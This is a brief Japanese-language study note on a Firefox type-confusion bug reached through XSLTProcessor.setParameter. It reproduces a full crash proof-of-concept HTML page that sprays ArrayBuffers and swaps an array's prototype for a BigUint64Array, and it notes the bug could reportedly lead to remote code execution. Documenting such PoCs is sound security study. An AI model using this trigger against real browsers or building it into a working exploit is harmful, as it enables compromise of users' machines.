# BigInt and Object type confusion vulnerability exploitable via XSLTProcessor setParameter method

https://bugzilla.mozilla.org/show_bug.cgi?id=1603055

XSLTProcessor の SetParameter Methodを介して、悪用可能なBig Int および、Objectタイプの混乱 (type confusion)の脆弱性
（正直）よくわかっていない。




以下、PoCの poc.html を読み込むと、クラッシュが発生する。
これを悪用することで、（曰く）RCEなどに繋がる可能性があるとのこと。

```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"></meta>
<script type="text/javascript">
function main(){
  var arr_vec = new Array(0x10000);
  for(var i = 0 ;i < arr_vec.length;i++)
  {
    arr_vec[i] = new ArrayBuffer(0x100);
  }
  alert("wait attach");
  var arr = [0x41414141]
  var mXSLTProcessor = new XSLTProcessor();
  arr.length = (12);
  var bigUint64Arr  = new BigUint64Array(new ArrayBuffer(0x100));
  bigUint64Arr[1] = BigInt(0x4242424242424242n);
  arr.__proto__ = bigUint64Arr;
  mXSLTProcessor.setParameter(('e'),('prop'),arr);
}
</script>
</head>
<body onload="main()">
</body>
</html>

```
